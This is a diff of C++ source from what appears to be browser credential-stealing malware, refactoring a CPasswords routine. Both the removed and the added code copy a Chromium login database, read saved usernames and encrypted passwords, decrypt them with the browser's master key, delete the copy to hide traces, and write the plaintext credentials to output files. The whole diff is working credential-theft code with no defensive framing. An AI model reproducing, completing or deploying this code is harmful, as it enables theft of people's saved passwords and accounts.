@@ -11,42 +11,20 @@ void CPasswords::execute(const fs::path &root, const std::string &name, const fs
     if(!exists(copied_db))
         return;
 
-    std::list<Login> history = this->getPasswords(copied_db);
+    std::list<std::unique_ptr<Entity>> passwords;
 
-    fs::remove(copied_db);
-
-    if(history.empty())
-        return;
-
-    std::stringstream ss;
-
-    for(Login &row : history)
-    {
-        if(row.password.empty() && row.username.empty())
-            continue;
-
-        row.write(ss);
-    }
-
-    Utils::writeFile(root / "Passwords.txt", ss.str(), true);
-}
-
-std::list<Login> CPasswords::getPasswords(const fs::path &db_path) {
-    std::list<Login> passwords;
-
-    SQLiteUtil::connectAndRead("SELECT origin_url, username_value, password_value FROM logins ORDER BY times_used DESC", db_path, [this, &passwords](sqlite3_stmt *stmt) {
-        Login password_record;
-        password_record.origin = SQLiteUtil::readString(stmt, 0);
-        password_record.username = SQLiteUtil::readString(stmt, 1);
-
-        std::vector<BYTE> password_encrypted = SQLiteUtil::readBytes(stmt, 2);
+    SQLiteUtil::connectAndRead("SELECT origin_url, username_value, password_value FROM logins ORDER BY times_used DESC", copied_db, [this, &passwords](sqlite3_stmt *stmt) {
+        auto password = std::make_unique<Password>();
+        password->origin = SQLiteUtil::readString(stmt, 0);
+        password->username = SQLiteUtil::readString(stmt, 1);
 
         std::vector<BYTE> master_key = this->getMasterKey();
-        std::string decoded_password = ChromiumUtil::decryptData(password_encrypted, master_key);
-        password_record.password = decoded_password;
+        std::string decoded_password = ChromiumUtil::decryptData(SQLiteUtil::readBytes(stmt, 2), master_key);
+        password->password = decoded_password;
 
-        passwords.push_back(password_record);
+        passwords.push_back(std::move(password));
     });
 
-    return passwords;
+    fs::remove(copied_db);
+    Entity::writeSelf(root, passwords);
 }
